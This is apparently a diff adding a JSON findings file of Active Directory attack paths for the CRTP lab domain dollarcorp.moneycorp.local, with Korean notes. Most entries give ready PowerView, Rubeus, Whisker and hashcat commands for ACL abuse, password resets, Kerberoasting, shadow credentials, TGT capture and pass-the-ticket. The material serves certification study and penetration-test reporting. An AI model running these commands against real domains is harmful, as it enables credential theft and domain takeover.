+        "Get-DomainObjectAcl -Identity APPLOCKER@DOLLARCORP.MONEYCORP.LOCAL -ResolveGUIDs"
+      ]
+    },
+    "verify": [
+      "RDPUSERS@DOLLARCORP.MONEYCORP.LOCAL 를 실제로 제어 가능한지 (현재 컨텍스트/크랙된 자격)",
+      "권한 행사 후 대상에 대한 실질적 접근 획득 확인"
+    ],
+    "screenshots": [
+      "ACL 확인: Get-DomainObjectAcl -Identity APPLOCKER@DOLLARCORP.MONEYCORP.LOCAL 출력",
+      "권한 남용 실행 화면 (그룹 추가 / 패스워드 변경 등)",
+      "남용 후 획득한 접근 증명 화면"
+    ],
+    "report_notes": "RDPUSERS@DOLLARCORP.MONEYCORP.LOCAL -(GenericWrite)-> APPLOCKER@DOLLARCORP.MONEYCORP.LOCAL. CRTP 경로에서 자주 나오는 ACL 체인.",
+    "priority": 25
+  },
+  {
+    "fid": "ACL-GenericWrite-DCORP-MGMT.DOLLARCORP.MONEYCORP.LOCAL-1121",
+    "technique": "ACL abuse: GenericWrite",
+    "crtp_topic": "Domain Privilege Escalation / Persistence",
+    "severity": "HIGH",
+    "targets": [
+      "DCORP-MGMT.DOLLARCORP.MONEYCORP.LOCAL"
+    ],
+    "evidence": [
+      "CIADMIN@DOLLARCORP.MONEYCORP.LOCAL has GenericWrite over DCORP-MGMT.DOLLARCORP.MONEYCORP.LOCAL"
+    ],
+    "commands": {
+      "PowerView": [
+        "Get-DomainObjectAcl -Identity DCORP-MGMT$ -ResolveGUIDs"
+      ]
+    },
+    "verify": [
+      "CIADMIN@DOLLARCORP.MONEYCORP.LOCAL 를 실제로 제어 가능한지 (현재 컨텍스트/크랙된 자격)",
+      "권한 행사 후 대상에 대한 실질적 접근 획득 확인"
+    ],
+    "screenshots": [
+      "ACL 확인: Get-DomainObjectAcl -Identity DCORP-MGMT.DOLLARCORP.MONEYCORP.LOCAL 출력",
+      "권한 남용 실행 화면 (그룹 추가 / 패스워드 변경 등)",
+      "남용 후 획득한 접근 증명 화면"
+    ],
+    "report_notes": "CIADMIN@DOLLARCORP.MONEYCORP.LOCAL -(GenericWrite)-> DCORP-MGMT.DOLLARCORP.MONEYCORP.LOCAL. CRTP 경로에서 자주 나오는 ACL 체인.",
+    "priority": 25
+  },
+  {
+    "fid": "ACL-GenericWrite-DEVOPS POLICY@DOLLARCORP.MONEYCORP.LOCAL-7101",
+    "technique": "ACL abuse: GenericWrite",
+    "crtp_topic": "Domain Privilege Escalation / Persistence",
+    "severity": "HIGH",
+    "targets": [
+      "DEVOPS POLICY@DOLLARCORP.MONEYCORP.LOCAL"
+    ],
+    "evidence": [
+      "DEVOPSADMIN@DOLLARCORP.MONEYCORP.LOCAL has GenericWrite over DEVOPS POLICY@DOLLARCORP.MONEYCORP.LOCAL"
+    ],
+    "commands": {
+      "PowerView": [
+        "Get-DomainObjectAcl -Identity DEVOPS POLICY@DOLLARCORP.MONEYCORP.LOCAL -ResolveGUIDs"
+      ]
+    },
+    "verify": [
+      "DEVOPSADMIN@DOLLARCORP.MONEYCORP.LOCAL 를 실제로 제어 가능한지 (현재 컨텍스트/크랙된 자격)",
+      "권한 행사 후 대상에 대한 실질적 접근 획득 확인"
+    ],
+    "screenshots": [
+      "ACL 확인: Get-DomainObjectAcl -Identity DEVOPS POLICY@DOLLARCORP.MONEYCORP.LOCAL 출력",
+      "권한 남용 실행 화면 (그룹 추가 / 패스워드 변경 등)",
+      "남용 후 획득한 접근 증명 화면"
+    ],
+    "report_notes": "DEVOPSADMIN@DOLLARCORP.MONEYCORP.LOCAL -(GenericWrite)-> DEVOPS POLICY@DOLLARCORP.MONEYCORP.LOCAL. CRTP 경로에서 자주 나오는 ACL 체인.",
+    "priority": 25
+  },
+  {
+    "fid": "ACL-Owns-DNSUPDATEPROXY@DOLLARCORP.MONEYCORP.LOCAL-stem",
+    "technique": "ACL abuse: Owns",
+    "crtp_topic": "Domain Privilege Escalation / Persistence",
+    "severity": "HIGH",
+    "targets": [
+      "DNSUPDATEPROXY@DOLLARCORP.MONEYCORP.LOCAL"
+    ],
+    "evidence": [
+      "Local System has Owns over DNSUPDATEPROXY@DOLLARCORP.MONEYCORP.LOCAL"
+    ],
+    "commands": {
+      "PowerView": [
+        "Add-DomainGroupMember -Identity 'DnsUpdateProxy' -Members <you>"
+      ],
+      "AD Module": [
+        "Add-ADGroupMember -Identity 'DnsUpdateProxy' -Members <you>"
+      ]
+    },
+    "verify": [
+      "Local System 를 실제로 제어 가능한지 (현재 컨텍스트/크랙된 자격)",
+      "권한 행사 후 대상에 대한 실질적 접근 획득 확인"
+    ],
+    "screenshots": [
+      "ACL 확인: Get-DomainObjectAcl -Identity DNSUPDATEPROXY@DOLLARCORP.MONEYCORP.LOCAL 출력",
+      "권한 남용 실행 화면 (그룹 추가 / 패스워드 변경 등)",
+      "남용 후 획득한 접근 증명 화면"
+    ],
+    "report_notes": "Local System -(Owns)-> DNSUPDATEPROXY@DOLLARCORP.MONEYCORP.LOCAL. CRTP 경로에서 자주 나오는 ACL 체인.",
+    "priority": 25
+  },
+  {
+    "fid": "ACL-WriteDacl-DEVOPS POLICY@DOLLARCORP.MONEYCORP.LOCAL-7101",
+    "technique": "ACL abuse: WriteDacl",
+    "crtp_topic": "Domain Privilege Escalation / Persistence",
+    "severity": "HIGH",
+    "targets": [
+      "DEVOPS POLICY@DOLLARCORP.MONEYCORP.LOCAL"
+    ],
+    "evidence": [
+      "DEVOPSADMIN@DOLLARCORP.MONEYCORP.LOCAL has WriteDacl over DEVOPS POLICY@DOLLARCORP.MONEYCORP.LOCAL"
+    ],
+    "commands": {
+      "PowerView": [
+        "# 소유권/DACL 장악 후 권한 부여",
+        "Set-DomainObjectOwner -Identity DEVOPS POLICY@DOLLARCORP.MONEYCORP.LOCAL -OwnerIdentity <you>",
+        "Add-DomainObjectAcl -TargetIdentity DEVOPS POLICY@DOLLARCORP.MONEYCORP.LOCAL -PrincipalIdentity <you> -Rights All"
+      ]
+    },
+    "verify": [
+      "DEVOPSADMIN@DOLLARCORP.MONEYCORP.LOCAL 를 실제로 제어 가능한지 (현재 컨텍스트/크랙된 자격)",
+      "권한 행사 후 대상에 대한 실질적 접근 획득 확인"
+    ],
+    "screenshots": [
+      "ACL 확인: Get-DomainObjectAcl -Identity DEVOPS POLICY@DOLLARCORP.MONEYCORP.LOCAL 출력",
+      "권한 남용 실행 화면 (그룹 추가 / 패스워드 변경 등)",
+      "남용 후 획득한 접근 증명 화면"
+    ],
+    "report_notes": "DEVOPSADMIN@DOLLARCORP.MONEYCORP.LOCAL -(WriteDacl)-> DEVOPS POLICY@DOLLARCORP.MONEYCORP.LOCAL. CRTP 경로에서 자주 나오는 ACL 체인.",
+    "priority": 25
+  },
+  {
+    "fid": "ACL-WriteDacl-RAS AND IAS SERVERS ACCESS CHECK@DOLLARCORP.MONEYCORP.LOCAL--553",
+    "technique": "ACL abuse: WriteDacl",
+    "crtp_topic": "Domain Privilege Escalation / Persistence",
+    "severity": "HIGH",
+    "targets": [
+      "RAS AND IAS SERVERS ACCESS CHECK@DOLLARCORP.MONEYCORP.LOCAL"
+    ],
+    "evidence": [
+      "RAS AND IAS SERVERS@DOLLARCORP.MONEYCORP.LOCAL has WriteDacl over RAS AND IAS SERVERS ACCESS CHECK@DOLLARCORP.MONEYCORP.LOCAL"
+    ],
+    "commands": {
+      "PowerView": [
+        "# 소유권/DACL 장악 후 권한 부여",
+        "Set-DomainObjectOwner -Identity RAS AND IAS SERVERS ACCESS CHECK@DOLLARCORP.MONEYCORP.LOCAL -OwnerIdentity <you>",
+        "Add-DomainObjectAcl -TargetIdentity RAS AND IAS SERVERS ACCESS CHECK@DOLLARCORP.MONEYCORP.LOCAL -PrincipalIdentity <you> -Rights All"
+      ]
+    },
+    "verify": [
+      "RAS AND IAS SERVERS@DOLLARCORP.MONEYCORP.LOCAL 를 실제로 제어 가능한지 (현재 컨텍스트/크랙된 자격)",
+      "권한 행사 후 대상에 대한 실질적 접근 획득 확인"
+    ],
+    "screenshots": [
+      "ACL 확인: Get-DomainObjectAcl -Identity RAS AND IAS SERVERS ACCESS CHECK@DOLLARCORP.MONEYCORP.LOCAL 출력",
+      "권한 남용 실행 화면 (그룹 추가 / 패스워드 변경 등)",
+      "남용 후 획득한 접근 증명 화면"
+    ],
+    "report_notes": "RAS AND IAS SERVERS@DOLLARCORP.MONEYCORP.LOCAL -(WriteDacl)-> RAS AND IAS SERVERS ACCESS CHECK@DOLLARCORP.MONEYCORP.LOCAL. CRTP 경로에서 자주 나오는 ACL 체인.",
+    "priority": 25
+  },
+  {
+    "fid": "ACL-WriteOwner-DEVOPS POLICY@DOLLARCORP.MONEYCORP.LOCAL-7101",
+    "technique": "ACL abuse: WriteOwner",
+    "crtp_topic": "Domain Privilege Escalation / Persistence",
+    "severity": "HIGH",
+    "targets": [
+      "DEVOPS POLICY@DOLLARCORP.MONEYCORP.LOCAL"
+    ],
+    "evidence": [
+      "DEVOPSADMIN@DOLLARCORP.MONEYCORP.LOCAL has WriteOwner over DEVOPS POLICY@DOLLARCORP.MONEYCORP.LOCAL"
+    ],
+    "commands": {
+      "PowerView": [
+        "# 소유권/DACL 장악 후 권한 부여",
+        "Set-DomainObjectOwner -Identity DEVOPS POLICY@DOLLARCORP.MONEYCORP.LOCAL -OwnerIdentity <you>",
+        "Add-DomainObjectAcl -TargetIdentity DEVOPS POLICY@DOLLARCORP.MONEYCORP.LOCAL -PrincipalIdentity <you> -Rights All"
+      ]
+    },
+    "verify": [
+      "DEVOPSADMIN@DOLLARCORP.MONEYCORP.LOCAL 를 실제로 제어 가능한지 (현재 컨텍스트/크랙된 자격)",
+      "권한 행사 후 대상에 대한 실질적 접근 획득 확인"
+    ],
+    "screenshots": [
+      "ACL 확인: Get-DomainObjectAcl -Identity DEVOPS POLICY@DOLLARCORP.MONEYCORP.LOCAL 출력",
+      "권한 남용 실행 화면 (그룹 추가 / 패스워드 변경 등)",
+      "남용 후 획득한 접근 증명 화면"
+    ],
+    "report_notes": "DEVOPSADMIN@DOLLARCORP.MONEYCORP.LOCAL -(WriteOwner)-> DEVOPS POLICY@DOLLARCORP.MONEYCORP.LOCAL. CRTP 경로에서 자주 나오는 ACL 체인.",
+    "priority": 25
+  },
+  {
+    "fid": "ACL-WriteOwner-RAS AND IAS SERVERS ACCESS CHECK@DOLLARCORP.MONEYCORP.LOCAL--553",
+    "technique": "ACL abuse: WriteOwner",
+    "crtp_topic": "Domain Privilege Escalation / Persistence",
+    "severity": "HIGH",
+    "targets": [
+      "RAS AND IAS SERVERS ACCESS CHECK@DOLLARCORP.MONEYCORP.LOCAL"
+    ],
+    "evidence": [
+      "RAS AND IAS SERVERS@DOLLARCORP.MONEYCORP.LOCAL has WriteOwner over RAS AND IAS SERVERS ACCESS CHECK@DOLLARCORP.MONEYCORP.LOCAL"
+    ],
+    "commands": {
+      "PowerView": [
+        "# 소유권/DACL 장악 후 권한 부여",
+        "Set-DomainObjectOwner -Identity RAS AND IAS SERVERS ACCESS CHECK@DOLLARCORP.MONEYCORP.LOCAL -OwnerIdentity <you>",
+        "Add-DomainObjectAcl -TargetIdentity RAS AND IAS SERVERS ACCESS CHECK@DOLLARCORP.MONEYCORP.LOCAL -PrincipalIdentity <you> -Rights All"
+      ]
+    },
+    "verify": [
+      "RAS AND IAS SERVERS@DOLLARCORP.MONEYCORP.LOCAL 를 실제로 제어 가능한지 (현재 컨텍스트/크랙된 자격)",
+      "권한 행사 후 대상에 대한 실질적 접근 획득 확인"
+    ],
+    "screenshots": [
+      "ACL 확인: Get-DomainObjectAcl -Identity RAS AND IAS SERVERS ACCESS CHECK@DOLLARCORP.MONEYCORP.LOCAL 출력",
+      "권한 남용 실행 화면 (그룹 추가 / 패스워드 변경 등)",
+      "남용 후 획득한 접근 증명 화면"
+    ],
+    "report_notes": "RAS AND IAS SERVERS@DOLLARCORP.MONEYCORP.LOCAL -(WriteOwner)-> RAS AND IAS SERVERS ACCESS CHECK@DOLLARCORP.MONEYCORP.LOCAL. CRTP 경로에서 자주 나오는 ACL 체인.",
+    "priority": 25
+  },
+  {
+    "fid": "ACL-GenericAll-BULK-1123",
+    "technique": "ACL abuse: GenericAll (bulk — 41 targets)",
+    "crtp_topic": "Domain Privilege Escalation / Persistence",
+    "severity": "HIGH",
+    "targets": [
+      "CONTROL201USER@DOLLARCORP.MONEYCORP.LOCAL",
+      "CONTROL202USER@DOLLARCORP.MONEYCORP.LOCAL",
+      "CONTROL203USER@DOLLARCORP.MONEYCORP.LOCAL",
+      "CONTROL204USER@DOLLARCORP.MONEYCORP.LOCAL",
+      "CONTROL205USER@DOLLARCORP.MONEYCORP.LOCAL",
+      "CONTROL206USER@DOLLARCORP.MONEYCORP.LOCAL",
+      "CONTROL207USER@DOLLARCORP.MONEYCORP.LOCAL",
+      "CONTROL208USER@DOLLARCORP.MONEYCORP.LOCAL",
+      "CONTROL209USER@DOLLARCORP.MONEYCORP.LOCAL",
+      "CONTROL210USER@DOLLARCORP.MONEYCORP.LOCAL",
+      "CONTROL211USER@DOLLARCORP.MONEYCORP.LOCAL",
+      "CONTROL212USER@DOLLARCORP.MONEYCORP.LOCAL",
+      "CONTROL213USER@DOLLARCORP.MONEYCORP.LOCAL",
+      "CONTROL214USER@DOLLARCORP.MONEYCORP.LOCAL",
+      "CONTROL215USER@DOLLARCORP.MONEYCORP.LOCAL",
+      "CONTROL216USER@DOLLARCORP.MONEYCORP.LOCAL",
+      "CONTROL217USER@DOLLARCORP.MONEYCORP.LOCAL",
+      "CONTROL218USER@DOLLARCORP.MONEYCORP.LOCAL",
+      "CONTROL219USER@DOLLARCORP.MONEYCORP.LOCAL",
+      "CONTROL220USER@DOLLARCORP.MONEYCORP.LOCAL",
+      "SUPPORT201USER@DOLLARCORP.MONEYCORP.LOCAL",
+      "SUPPORT202USER@DOLLARCORP.MONEYCORP.LOCAL",
+      "SUPPORT203USER@DOLLARCORP.MONEYCORP.LOCAL",
+      "SUPPORT204USER@DOLLARCORP.MONEYCORP.LOCAL",
+      "SUPPORT205USER@DOLLARCORP.MONEYCORP.LOCAL",
+      "SUPPORT206USER@DOLLARCORP.MONEYCORP.LOCAL",
+      "SUPPORT207USER@DOLLARCORP.MONEYCORP.LOCAL",
+      "SUPPORT208USER@DOLLARCORP.MONEYCORP.LOCAL",
+      "SUPPORT209USER@DOLLARCORP.MONEYCORP.LOCAL",
+      "SUPPORT210USER@DOLLARCORP.MONEYCORP.LOCAL",
+      "SUPPORT211USER@DOLLARCORP.MONEYCORP.LOCAL",
+      "SUPPORT212USER@DOLLARCORP.MONEYCORP.LOCAL",
+      "SUPPORT213USER@DOLLARCORP.MONEYCORP.LOCAL",
+      "SUPPORT214USER@DOLLARCORP.MONEYCORP.LOCAL",
+      "SUPPORT215USER@DOLLARCORP.MONEYCORP.LOCAL",
+      "SUPPORT216USER@DOLLARCORP.MONEYCORP.LOCAL",
+      "SUPPORT217USER@DOLLARCORP.MONEYCORP.LOCAL",
+      "SUPPORT218USER@DOLLARCORP.MONEYCORP.LOCAL",
+      "SUPPORT219USER@DOLLARCORP.MONEYCORP.LOCAL",
+      "SUPPORT220USER@DOLLARCORP.MONEYCORP.LOCAL",
+      "APPLOCKER@DOLLARCORP.MONEYCORP.LOCAL"
+    ],
+    "evidence": [
+      "RDPUSERS@DOLLARCORP.MONEYCORP.LOCAL has GenericAll over 41 objects: CONTROL201USER@DOLLARCORP.MONEYCORP.LOCAL, CONTROL202USER@DOLLARCORP.MONEYCORP.LOCAL, CONTROL203USER@DOLLARCORP.MONEYCORP.LOCAL, CONTROL204USER@DOLLARCORP.MONEYCORP.LOCAL, CONTROL205USER@DOLLARCORP.MONEYCORP.LOCAL, CONTROL206USER@DOLLARCORP.MONEYCORP.LOCAL … (+35 more)"
+    ],
+    "commands": {
+      "Targeted (choose one)": [
+        "# 옵션 A: 패스워드 리셋",
+        "Set-DomainUserPassword -Identity Control201user -AccountPassword (ConvertTo-SecureString '<NewPass123!>' -AsPlainText -Force)",
+        "# 옵션 B: Targeted Kerberoast (SPN 부여 후 로스팅)",
+        "Set-DomainObject -Identity Control201user -Set @{serviceprincipalname='fake/svc'}",
+        "Rubeus.exe kerberoast /user:Control201user /nowrap",
+        "# 옵션 C: Shadow Credentials",
+        "Whisker.exe add /target:Control201user"
+      ]
+    },
+    "verify": [
+      "RDPUSERS@DOLLARCORP.MONEYCORP.LOCAL 를 실제로 제어 가능한지 (현재 컨텍스트/크랙된 자격)",
+      "경로에 필요한 대상 1개만 선택해 권한 행사 (전부 할 필요 없음)"
+    ],
+    "screenshots": [
+      "ACL 확인 출력 (대표 대상 1개)",
+      "권한 남용 실행 화면",
+      "남용 후 획득 접근 증명 화면"
+    ],
+    "report_notes": "RDPUSERS@DOLLARCORP.MONEYCORP.LOCAL 가 41개 객체에 GenericAll — 보통 그룹 권한으로 일괄 부여된 관계. 경로에 필요한 대상만 선택적으로 악용.",
+    "priority": 26
+  },
+  {
+    "fid": "KERB-websvc",
+    "technique": "Kerberoasting",
+    "crtp_topic": "Domain Privilege Escalation",
+    "severity": "MEDIUM",
+    "targets": [
+      "websvc"
+    ],
+    "evidence": [
+      "websvc has SPN set; pwdlastset=1668400933"
+    ],
+    "commands": {
+      "Rubeus": [
+        "Rubeus.exe kerberoast /user:websvc /nowrap /outfile:hash_websvc.txt"
+      ],
+      "PowerView": [
+        "Invoke-Kerberoast -Identity websvc | fl"
+      ],
+      "AD Module": [
+        "Get-ADUser -Identity websvc -Properties ServicePrincipalName | select SamAccountName,ServicePrincipalName"
+      ],
+      "Crack": [
+        "hashcat -m 13100 hash_websvc.txt <wordlist> --force"
+      ]
+    },
+    "verify": [
+      "SPN이 실제로 설정돼 있는지 (setspn -L 또는 Get-ADUser)",
+      "해시 추출 성공 여부, 크랙된 평문 패스워드",
+      "크랙한 계정이 어떤 그룹/권한을 가지는지 확인"
+    ],
+    "screenshots": [
+      "websvc SPN 확인 (Get-ADUser/setspn 출력)",
+      "Rubeus kerberoast 해시 추출 화면",
+      "hashcat 크랙 성공 (평문 노출) 화면",
+      "크랙한 계정으로 인증/권한 확인 화면"
+    ],
+    "report_notes": "Kerberoasting websvc. adminCount 계정이면 곧바로 권한 상승 경로일 수 있음.",
+    "priority": 35
+  },
+  {
+    "fid": "UNCONST-DCORP-DC$",
+    "technique": "Unconstrained Delegation abuse",
+    "crtp_topic": "Domain Privilege Escalation",
+    "severity": "INFO",
+    "targets": [
+      "DCORP-DC$"
+    ],
+    "evidence": [
+      "DCORP-DC$ (computer) TRUSTED_FOR_DELEGATION [DC — expected]"
+    ],
+    "commands": {
+      "Enum (PowerView)": [
+        "Get-DomainComputer -Unconstrained | select samaccountname",
+        "Get-DomainUser -TrustedToAuth | select samaccountname"
+      ],
+      "Rubeus monitor": [
+        "Rubeus.exe monitor /interval:5 /nowrap"
+      ],
+      "Coerce (auth)": [
+        "# PetitPotam / SpoolSample 로 DC 인증 강제 → TGT 캡처",
+        "Rubeus.exe tgtdeleg"
+      ],
+      "PTT": [
+        "Rubeus.exe ptt /ticket:<base64_TGT>"
+      ]
+    },
+    "verify": [
+      "해당 호스트에 로컬 관리자 권한이 있는지 (티켓 모니터링 전제)",
+      "캡처된 TGT의 주체가 특권 계정/DC 컴퓨터 계정인지"
+    ],
+    "screenshots": [
+      "DCORP-DC$ Unconstrained delegation 속성 확인",
+      "Rubeus monitor 로 캡처된 TGT 화면",
+      "PTT 후 특권 접근 확인 (예: DCSync 또는 DC 접근)"
+    ],
+    "report_notes": "비-DC 호스트의 무제약 위임은 치명적. DC 인증 강제 후 TGT 탈취 경로.",
+    "priority": 80
+  }
+]
